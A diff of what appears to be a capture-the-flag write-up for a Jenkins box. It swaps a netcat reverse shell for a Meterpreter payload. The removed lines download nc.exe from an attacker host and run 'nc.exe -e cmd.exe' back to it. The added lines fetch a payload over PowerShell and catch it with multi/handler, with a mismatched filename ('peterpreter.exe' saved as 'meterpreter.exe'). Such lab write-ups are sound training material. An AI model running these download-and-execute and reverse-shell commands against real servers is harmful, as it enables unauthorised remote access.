@@ -33,16 +33,16 @@ http://10.10.10.63:50000/askjeeves/securityRealm/user/admin/
 
 1. On Jenkins create a new Item “Execute Windows bash command” and select “Freestyle Project”
 2. Select “Add building Step” and select  “Execute Windows bash command” 
-3. On the bash console type 
+3. On the bash console type:
 ```ruby
-powershell wget "http://10.10.14.14/nc.exe" -outfile "nc.exe" 
-nc.exe -e cmd.exe 10.10.14.14 9999
+powershell wget "http://10.10.14.14/peterpreter.exe" -outfile "meterpreter.exe" 
 ```
-4. Start apache and place nc.exe for download 
-5. Set up nc to listen up
-6. Run the shell on jenkins 
+![](https://lh3.googleusercontent.com/YDkMzr-vtiHmFXOcfFhQ-jH7jwJHqIA4mG4VtCR5_4V5ddTdi5DNFvuYu0_iUxyFGg0mYeDa01p2dWkin60m-wXyvGVl3T2jdiAD9fkGPeCyQRobjP6idpoJ1euKxPaDeQpy-KF7P049lf4x61VASqfhxHpgX_Te_1K7_KPRhIUCwyOzxlwtcKH5y891IF2gyIJk6qNwPyGUgfypQLVWTBzUksJfSUE_dfyOFUWeUVQtK5dSw4YHeNRKlHUu_wZkRf8uRfpuiiCbZnCrYJo08-ZVSDvq7WLYLP7_sfMQvybWlsuXdM8ey_4fyVJutkeu2oYdXRDtBOU22ZROYG5N5kXXvo-8dfKJlhJIC_LMCmEbO7vYjekIXCfJUnHfGwvuf92By4OASnShb63mQpC0ELRs0U0u5WYWkAWBKJdYrxLabjuwjt6dqT_PIjeq9wbrdLlLvN0Zt4ylq_wiyrMLLdrs-EecKC-BDNc24pwU1ZQA1Xkg3JNWCzAYWKV82N8E5QfKroZoWkgWRspDH-x-r3_Y4PFNMBzG7NAhDh2FHsm_aUZgXZubmhmbdAkRfSg5oGgrVTcCdDVhGPYFpglpjAX_7f6_29ZLRUWzdAf29SOyfeDORA_g6Wnu9sY32BjpIeKENlQKpSVjiz9UwepfZDeMxUq_7_HHO_tWEu7MDk3T5Kf8TrIGo9s=w970-h314-no)
 
-Optional and recommended: you can also create a msfvenom shell and multihadler to catch it 
+4. Start apache and place meterpreter.exe file for download 
+5. Set up multi/handler
+6. Run the shell on jenkins 
+ 
 
 # Privilege Escalation Method 1
 1. Download CEH.kdbx keepass file
